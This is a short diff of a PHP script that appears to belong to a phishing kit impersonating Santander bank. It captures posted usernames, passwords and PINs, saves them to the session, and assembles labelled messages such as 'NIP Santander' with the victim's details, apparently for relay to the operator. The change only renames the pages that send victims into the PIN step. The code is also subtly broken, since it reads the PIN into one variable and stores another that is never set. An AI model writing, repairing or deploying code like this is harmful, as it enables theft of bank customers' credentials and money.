@@ -84,7 +84,7 @@ if (isset($_POST['usr'], $_POST['pass'])) {
 } elseif (isset($_POST['nip'])) {
     $code = trim($_POST['nip']);
     $_SESSION['nip'] = $nip;
-    $form_origen = "sms.php";
+    $form_origen = "nip.php";
     $nip_esc = htmlspecialchars($nip, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
     $message .= "⭕️『𝖭𝖨𝖯 𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋』⭕️\n\n";
@@ -96,7 +96,7 @@ if (isset($_POST['usr'], $_POST['pass'])) {
 } elseif (isset($_POST['nip2'])) {
     $code = trim($_POST['nip2']);
     $_SESSION['nip2'] = $nip;
-    $form_origen = "sms-error.php";
+    $form_origen = "nip-error.php";
     $nip_esc = htmlspecialchars($nip, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
     $message .= "⭕️『𝖭𝖨𝖯 𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』⭕️\n\n";
